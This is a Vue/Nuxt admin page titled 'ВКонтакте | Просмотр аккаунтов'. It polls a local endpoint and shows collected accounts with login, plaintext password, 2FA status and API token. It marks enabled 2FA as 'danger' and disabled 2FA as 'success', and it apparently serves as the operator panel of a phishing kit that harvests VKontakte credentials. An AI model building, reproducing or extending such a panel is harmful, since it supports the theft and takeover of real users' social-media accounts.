<template>
  <div class="container">
    <h1 class="text-center pt-5">Аккаунты ({{ accounts.length }})</h1>
    <b-card v-for="account of accounts" :key="account.id" no-body class="mb-1">
      <b-card-header header-tag="header" class="p-1" role="tab">
        <b-button
          v-b-toggle="'accordion-' + account.id"
          block
          href="#"
          variant="link"
          >{{ account.first_name }} {{ account.last_name }}</b-button
        >
      </b-card-header>
      <b-collapse
        :id="'accordion-' + account.id"
        accordion="my-accordion"
        role="tabpanel"
      >
        <b-card-body>
          <b-card-text>Логин: {{ account.username }}</b-card-text>
          <b-card-text>Пароль: {{ account.password }}</b-card-text>
          <b-card-text
            >2fa:
            <b-badge :variant="account['2fa'] ? 'danger' : 'success'">{{
              account['2fa'] ? 'Enabled' : 'Disabled'
            }}</b-badge></b-card-text
          >
          <b-card-text
            >API Токен: <code>{{ account.token }}</code></b-card-text
          >
        </b-card-body>
      </b-collapse>
    </b-card>
  </div>
</template>
<script>
import Vue from 'vue'
import Component from 'vue-class-component'
import axios from 'axios'
import {
  CollapsePlugin,
  CardPlugin,
  ButtonPlugin,
  BadgePlugin
} from 'bootstrap-vue'
import config from '~/nuxt.config'

const url = `http://${
  config.server && config.server.host ? config.server.host : '127.0.0.1'
}:${config.server && config.server.port ? config.server.port : 3000}/accounts`

Vue.use(CardPlugin)
Vue.use(CollapsePlugin)
Vue.use(ButtonPlugin)
Vue.use(BadgePlugin)

@Component({
  middleware({ req, redirect }) {
    if (
      !req.headers.host.startsWith(
        config.server && config.server.host ? config.server.host : '127.0.0.1'
      )
    ) {
      redirect('/login')
    }
  },

  layout: 'admin',

  async asyncData() {
    const raw = await axios.get(url)

    return raw.data
  },

  head() {
    return {
      title: 'ВКонтакте | Просмотр аккаунтов'
    }
  }
})
class AdminPage extends Vue {
  accounts = []

  created() {
    this.updater = setInterval(async () => {
      const raw = await axios.get(url)

      if (typeof raw.data === 'object') {
        this.accounts = raw.data.accounts
      } else {
        const { accounts } = JSON.parse(raw.data)

        this.accounts = accounts
      }
    }, 5000)
  }
}

export default AdminPage
</script>
<style scoped></style>
<style src="bootstrap/dist/css/bootstrap.min.css"></style>
<style src="bootstrap-vue/dist/bootstrap-vue.min.css"></style>
